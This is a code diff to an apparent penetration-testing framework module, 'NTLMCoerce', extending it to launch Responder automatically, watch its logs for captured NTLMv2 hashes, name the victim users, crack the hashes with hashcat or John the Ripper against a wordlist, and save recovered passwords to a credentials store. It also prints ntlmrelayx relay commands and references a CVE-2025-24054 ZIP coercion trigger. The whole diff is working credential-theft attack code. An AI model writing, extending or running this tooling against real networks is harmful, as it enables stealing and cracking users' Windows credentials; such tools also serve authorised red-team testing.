@@ -12,6 +12,9 @@ import glob
 import struct
 import zipfile
 import tempfile
+import time
+import threading
+import signal
 from core.module_base import ModuleBase, ModuleType, Platform, find_tool
 
 
@@ -60,6 +63,19 @@ class NTLMCoerce(ModuleBase):
         self.register_option("PASS", "Password for SMB auth", default="")
         self.register_option("DOMAIN", "Domain for SMB auth", default="")
 
+        # Auto-capture and crack options
+        self.register_option("AUTO_RESPONDER", "Start Responder automatically", default="no", choices=["yes", "no"])
+        self.register_option("INTERFACE", "Network interface for Responder", default="tun0")
+        self.register_option("AUTO_CRACK", "Automatically crack captured hashes", default="no", choices=["yes", "no"])
+        self.register_option("WORDLIST", "Wordlist for hash cracking", default="/usr/share/wordlists/rockyou.txt")
+        self.register_option("WAIT_TIME", "Seconds to wait for hash capture (0=don't wait)", default="60")
+
+        # Internal state
+        self._responder_proc = None
+        self._captured_hashes = set()
+        self._hash_monitor_thread = None
+        self._stop_monitoring = False
+
 
     def run(self) -> bool:
         lhost = self.get_option("LHOST")
@@ -68,6 +84,11 @@ class NTLMCoerce(ModuleBase):
         output_dir = self.get_option("OUTPUT_DIR")
         create_zip = self.get_option("CREATE_ZIP") == "yes"
         share_name = self.get_option("SHARE_NAME")
+        auto_responder = self.get_option("AUTO_RESPONDER") == "yes"
+        auto_crack = self.get_option("AUTO_CRACK") == "yes"
+        interface = self.get_option("INTERFACE")
+        wait_time = int(self.get_option("WAIT_TIME"))
+        wordlist = self.get_option("WORDLIST")
 
         # Resolve output path using WORKING_DIR
         if self._config:
@@ -81,7 +102,19 @@ class NTLMCoerce(ModuleBase):
         self.print_status(f"Output: {output_dir}")
         if create_zip:
             self.print_status("ZIP wrapping: enabled (CVE-2025-24054 extraction trigger)")
+        if auto_responder:
+            self.print_status(f"Auto-Responder: enabled on {interface}")
+        if auto_crack:
+            self.print_status(f"Auto-Crack: enabled with {wordlist}")
         self.print_line()
+
+        # Start Responder if requested
+        if auto_responder:
+            if not self._start_responder(interface):
+                self.print_warning("Failed to start Responder, continuing without it...")
+            else:
+                # Start monitoring for hashes
+                self._start_hash_monitor()
 
         # Handle CVE-2025-24054 specific generation
         if file_type == "cve-2025-24054":
@@ -95,6 +128,7 @@ class NTLMCoerce(ModuleBase):
             # Run ntlm_theft
             success = self._run_ntlm_theft(lhost, filename, file_type, output_dir)
             if not success:
+                self._cleanup_responder()
                 return False
 
             # Also generate CVE-2025-24054 payloads when using "all"
@@ -107,6 +141,7 @@ class NTLMCoerce(ModuleBase):
 
         if not generated:
             self.print_warning("No files found in output directory")
+            self._cleanup_responder()
             return False
 
         self.print_line()
@@ -127,12 +162,24 @@ class NTLMCoerce(ModuleBase):
         if self.get_option("UPLOAD") == "yes" and generated:
             self._upload_files(generated)
 
-        self.print_line()
-        self.print_status("Start Responder before user browses to share:")
-        self.print_line(f"  responder -I tun0 -v")
-        self.print_line()
-        self.print_status("Or use ntlmrelayx for relay attacks:")
-        self.print_line(f"  ntlmrelayx.py -tf targets.txt -smb2support")
+        # Wait for hash capture if auto-responder is running
+        if auto_responder and wait_time > 0:
+            self.print_line()
+            self.print_status(f"Waiting up to {wait_time}s for hash capture (Ctrl+C to stop)...")
+            captured = self._wait_for_hashes(wait_time)
+
+            if captured and auto_crack:
+                self.print_line()
+                self._crack_hashes(captured, wordlist)
+
+            self._cleanup_responder()
+        elif not auto_responder:
+            self.print_line()
+            self.print_status("Start Responder before user browses to share:")
+            self.print_line(f"  responder -I {interface} -v")
+            self.print_line()
+            self.print_status("Or use ntlmrelayx for relay attacks:")
+            self.print_line(f"  ntlmrelayx.py -tf targets.txt -smb2support")
 
         return True
 
@@ -575,6 +622,174 @@ sys.exit(1)
         except Exception as e:
             self.print_error(f"Failed to create ZIP: {e}")
             return None
+
+    # ==================== Auto-Responder Methods ====================
+
+    def _start_responder(self, interface: str) -> bool:
+        """Start Responder in the background"""
+        self.print_status(f"Starting Responder on {interface}...")
+
+        # Check if Responder is already running
+        ret, stdout, stderr = self.run_in_exegol("pgrep -f 'Responder.py'", timeout=5)
+        if ret == 0 and stdout.strip():
+            self.print_warning("Responder is already running")
+            return True
+
+        # Start Responder in background
+        responder_cmd = f"nohup /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I {interface} > /tmp/responder.log 2>&1 &"
+        ret, stdout, stderr = self.run_in_exegol(responder_cmd, timeout=10)
+
+        # Give it a moment to start
+        time.sleep(2)
+
+        # Verify it started
+        ret, stdout, stderr = self.run_in_exegol("pgrep -f 'Responder.py'", timeout=5)
+        if ret == 0 and stdout.strip():
+            self.print_good("Responder started successfully")
+            return True
+        else:
+            self.print_error("Failed to start Responder")
+            return False
+
+    def _start_hash_monitor(self):
+        """Start monitoring Responder logs for new hashes"""
+        self._stop_monitoring = False
+        self._captured_hashes = set()
+
+        # Get initial hash count
+        self._get_existing_hashes()
+
+    def _get_existing_hashes(self) -> set:
+        """Get currently captured hashes from Responder logs"""
+        hashes = set()
+        ret, stdout, stderr = self.run_in_exegol(
+            "cat /opt/tools/Responder/logs/*NTLM*.txt 2>/dev/null || true",
+            timeout=10
+        )
+        if stdout:
+            for line in stdout.strip().split('\n'):
+                if line and '::' in line:
+                    hashes.add(line.strip())
+        self._captured_hashes = hashes
+        return hashes
+
+    def _wait_for_hashes(self, timeout: int) -> list:
+        """Wait for new hashes to be captured"""
+        initial_hashes = self._captured_hashes.copy()
+        new_hashes = []
+        start_time = time.time()
+
+        try:
+            while time.time() - start_time < timeout:
+                current_hashes = self._get_existing_hashes()
+                new_ones = current_hashes - initial_hashes
+
+                if new_ones:
+                    for h in new_ones:
+                        if h not in [nh for nh in new_hashes]:
+                            new_hashes.append(h)
+                            # Extract username from hash
+                            parts = h.split('::')
+                            if len(parts) >= 2:
+                                user = parts[0]
+                                self.print_good(f"Captured hash for: {user}")
+
+                time.sleep(2)
+
+        except KeyboardInterrupt:
+            self.print_warning("Hash capture interrupted")
+
+        if new_hashes:
+            self.print_line()
+            self.print_good(f"Captured {len(new_hashes)} new hash(es)")
+        else:
+            self.print_warning("No new hashes captured")
+
+        return new_hashes
+
+    def _crack_hashes(self, hashes: list, wordlist: str) -> None:
+        """Crack captured NTLMv2 hashes using hashcat"""
+        if not hashes:
+            return
+
+        self.print_status("Attempting to crack captured hashes...")
+
+        # Write hashes to temp file
+        hash_file = "/tmp/ntlm_hashes.txt"
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+            for h in hashes:
+                f.write(h + '\n')
+            hash_file = f.name
+
+        # Copy hash file to container
+        # Try hashcat first (mode 5600 = NTLMv2)
+        crack_cmd = f"hashcat -m 5600 {hash_file} {wordlist} --force --quiet -O 2>/dev/null"
+        self.print_status("Running hashcat (NTLMv2 mode 5600)...")
+
+        ret, stdout, stderr = self.run_in_exegol(crack_cmd, timeout=300)
+
+        if ret == 0:
+            # Check for cracked passwords
+            show_cmd = f"hashcat -m 5600 {hash_file} --show 2>/dev/null"
+            ret, stdout, stderr = self.run_in_exegol(show_cmd, timeout=30)
+
+            if stdout.strip():
+                self.print_line()
+                self.print_good("Cracked passwords:")
+                for line in stdout.strip().split('\n'):
+                    if line and ':' in line:
+                        self.print_line(f"  {line}")
+
+                        # Try to add to creds database
+                        try:
+                            parts = line.split(':')
+                            if len(parts) >= 2:
+                                # NTLMv2 format: user::domain:challenge:response:password
+                                user = parts[0]
+                                password = parts[-1]
+                                if hasattr(self, '_creds') and self._creds:
+                                    self._creds.add_credential(
+                                        username=user,
+                                        password=password,
+                                        cred_type="password",
+                                        source="ntlm_coerce hashcat"
+                                    )
+                        except Exception:
+                            pass
+            else:
+                self.print_warning("No passwords cracked (try a bigger wordlist)")
+        else:
+            # Try john as fallback
+            self.print_status("Hashcat failed, trying John the Ripper...")
+            john_cmd = f"john --format=netntlmv2 --wordlist={wordlist} {hash_file} 2>/dev/null"
+            ret, stdout, stderr = self.run_in_exegol(john_cmd, timeout=300)
+
+            # Show john results
+            show_cmd = f"john --format=netntlmv2 --show {hash_file} 2>/dev/null"
+            ret, stdout, stderr = self.run_in_exegol(show_cmd, timeout=30)
+
+            if stdout.strip() and "0 password hashes cracked" not in stdout:
+                self.print_line()
+                self.print_good("Cracked passwords:")
+                for line in stdout.strip().split('\n'):
+                    if line and ':' in line and 'password hashes cracked' not in line:
+                        self.print_line(f"  {line}")
+            else:
+                self.print_warning("No passwords cracked")
+
+        # Cleanup
+        try:
+            os.unlink(hash_file)
+        except Exception:
+            pass
+
+    def _cleanup_responder(self):
+        """Stop Responder and cleanup"""
+        self._stop_monitoring = True
+
+        # Check if we started Responder (don't kill if it was already running)
+        ret, stdout, stderr = self.run_in_exegol("pkill -f 'Responder.py' 2>/dev/null || true", timeout=5)
+        self.print_status("Responder stopped")
 
     def check(self) -> bool:
         """Check if ntlm_theft is available"""
